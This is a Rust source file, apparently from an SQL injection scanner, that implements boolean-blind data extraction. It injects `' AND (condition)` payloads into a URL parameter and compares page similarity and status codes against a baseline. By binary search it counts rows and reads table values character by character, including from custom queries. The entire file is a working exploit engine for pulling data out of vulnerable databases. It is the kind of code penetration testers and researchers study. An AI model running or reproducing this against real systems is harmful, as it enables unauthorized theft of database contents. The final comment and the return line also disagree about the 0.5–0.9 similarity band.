//! Boolean-blind data extraction: bisection algorithm for extracting
//! strings and numbers using TRUE/FALSE page-difference oracle.

use std::time::{Duration, Instant};
use anyhow::Result;
use tracing::info;

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
        CancellationToken, ExtractionStatus, HttpResponse,
    },
    similarity::calculate_similarity,
};

impl SqliDetector {
    /// Extract data using blind SQL injection (bisection algorithm).
    ///
    /// Extracts data character-by-character using O(log n) requests per char.
    pub async fn extract_data_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        extraction_config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        progress_callback: Option<Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<BlindExtractionResult> {
        let start_time = Instant::now();
        let mut total_requests = 0;
        let mut extracted_values = Vec::new();

        info!(
            "Starting blind data extraction from {}.{} using {:?}",
            extraction_config.target_table,
            extraction_config.target_column,
            extraction_config.technique
        );

        if let Some(ref token) = cancel_token
            && token.is_cancelled() {
                return Ok(BlindExtractionResult {
                    extracted_values: vec![],
                    total_requests: 0,
                    extraction_time_secs: 0,
                    technique_used: "Cancelled".to_string(),
                });
            }

        if let Some(ref callback) = progress_callback {
            callback(BlindExtractionProgress {
                current_value_index: 0,
                current_char_index: 0,
                extracted_so_far: String::new(),
                total_requests: 0,
                status: ExtractionStatus::Running,
            });
        }

        let technique = extraction_config.technique;

        let row_count = self
            .get_row_count_blind(
                url, param, original_value, extraction_config, baseline,
                &mut total_requests, cancel_token.as_ref(),
            )
            .await?;

        let rows_to_extract = row_count.min(extraction_config.max_rows);
        info!("Found {} rows, extracting {}", row_count, rows_to_extract);

        for row_index in 0..rows_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled() {
                    info!("Extraction cancelled after {} rows", row_index);
                    break;
                }

            let value = self
                .extract_string_blind(
                    url, param, original_value, extraction_config, baseline,
                    row_index, &mut total_requests,
                    progress_callback.as_ref(), cancel_token.as_ref(),
                )
                .await?;

            if !value.is_empty() {
                extracted_values.push(value.clone());
                if let Some(ref callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index + 1,
                        current_char_index: value.len(),
                        extracted_so_far: value,
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        let elapsed = start_time.elapsed();
        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);

        info!(
            "Blind extraction {}: {} values in {} requests ({:?})",
            if is_cancelled { "stopped" } else { "complete" },
            extracted_values.len(),
            total_requests,
            elapsed
        );

        Ok(BlindExtractionResult {
            extracted_values,
            total_requests,
            extraction_time_secs: elapsed.as_secs(),
            technique_used: format!("{:?}", technique),
        })
    }

    /// Get row count using boolean blind injection.
    pub(crate) async fn get_row_count_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<usize> {
        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(0);
            }

        let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
        // Cap at 1000 rows — 9999 caused binary search to return max when the
        // injection oracle couldn't distinguish TRUE/FALSE (e.g. login forms).
        let count = self
            .extract_number_blind(
                url, param, original_value, &query, baseline,
                0, 1000, request_count, cancel_token,
            )
            .await?;

        Ok(count as usize)
    }

    /// Extract a string value character by character using bisection.
    pub(crate) async fn extract_string_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        config: &BlindExtractionConfig,
        baseline: &HttpResponse,
        row_index: usize,
        request_count: &mut usize,
        progress_callback: Option<&Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<String> {
        let mut result = String::new();

        let subquery = if let Some(ref custom) = config.custom_query {
            format!("({})", custom)
        } else {
            format!(
                "(SELECT {} FROM {}{} LIMIT 1 OFFSET {})",
                config.target_column,
                config.target_table,
                config
                    .where_clause
                    .as_ref()
                    .map(|w| format!(" WHERE {}", w))
                    .unwrap_or_default(),
                row_index
            )
        };

        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(result);
            }

        let length_query = format!("LENGTH({})", subquery);
        let length = self
            .extract_number_blind(
                url, param, original_value, &length_query, baseline,
                0, config.max_length_per_value as i32, request_count, cancel_token,
            )
            .await?;

        info!("Row {} has length {}", row_index, length);

        for pos in 1..=length {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(result);
                }

            let char_query = format!("ASCII(SUBSTRING({}, {}, 1))", subquery, pos);
            let ascii_val = self
                .extract_number_blind(
                    url, param, original_value, &char_query, baseline,
                    0, 127, request_count, cancel_token,
                )
                .await?;

            if let Some(ch) = char::from_u32(ascii_val as u32) {
                result.push(ch);
                if let Some(callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index,
                        current_char_index: pos as usize,
                        extracted_so_far: result.clone(),
                        total_requests: *request_count,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        Ok(result)
    }

    /// Extract a number using bisection (binary search).
    ///
    /// Standard single-request-per-level bisection: while low < high,
    /// test `query > mid`. If true → low = mid + 1, else → high = mid.
    /// When low == high the answer is found. O(log n) requests, no equality check.
    pub(crate) async fn extract_number_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        query: &str,
        baseline: &HttpResponse,
        min_val: i32,
        max_val: i32,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
    ) -> Result<i32> {
        let mut low = min_val;
        let mut high = max_val;

        while low < high {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(low);
                }

            let mid = low + (high - low) / 2;

            let condition = format!("{} > {}", query, mid);
            let is_greater = self
                .test_condition_blind(url, param, original_value, &condition, baseline)
                .await?;
            *request_count += 1;

            if is_greater {
                low = mid + 1;
            } else {
                high = mid; // value <= mid, so mid is still a candidate
            }

            tokio::time::sleep(Duration::from_millis(self.config.delay_ms)).await;
        }

        Ok(low) // low == high == answer
    }

    /// Test a boolean condition using blind SQL injection.
    ///
    /// Returns `true` if the condition is TRUE (page matches baseline).
    /// Uses a two-signal oracle:
    ///   1. Body similarity > 0.9 (classic content-reflection detection).
    ///   2. Status code match: if condition-true => baseline status, that's TRUE.
    ///
    /// For login forms that always return the same body (e.g. 200 login page or
    /// 302 redirect), the status-code signal takes priority over body similarity.
    /// This prevents the false-positive where ALL conditions appear "true" because
    /// body content never changes (causing binary search to converge to max_val).
    pub(crate) async fn test_condition_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        condition: &str,
        baseline: &HttpResponse,
    ) -> Result<bool> {
        let is_numeric = original_value.parse::<i64>().is_ok();

        let true_payload = if is_numeric {
            format!("{} AND {}", original_value, condition)
        } else {
            format!("{}' AND ({})", original_value, condition)
        };

        let test_url = self.build_test_url(url, param, original_value, &true_payload);
        let response = self.send_request(&test_url).await?;

        let similarity = calculate_similarity(&baseline.body, &response.body);
        let status_matches = response.status == baseline.status;

        // If body similarity is clearly low, this is a FALSE condition regardless of status.
        if similarity < 0.5 {
            return Ok(false);
        }

        // If body is very similar AND status matches — clearly TRUE.
        if similarity > 0.9 && status_matches {
            return Ok(true);
        }

        // Status mismatch is a strong FALSE signal (e.g. 200 baseline but condition
        // causes 302 redirect when query fails, or vice versa).
        if !status_matches {
            // A status change means the condition altered the query result.
            // TRUE condition should preserve baseline status; status change = FALSE.
            return Ok(false);
        }

        // Both status matches and body is moderately similar (0.5-0.9): treat as TRUE.
        Ok(similarity > 0.9)
    }
}
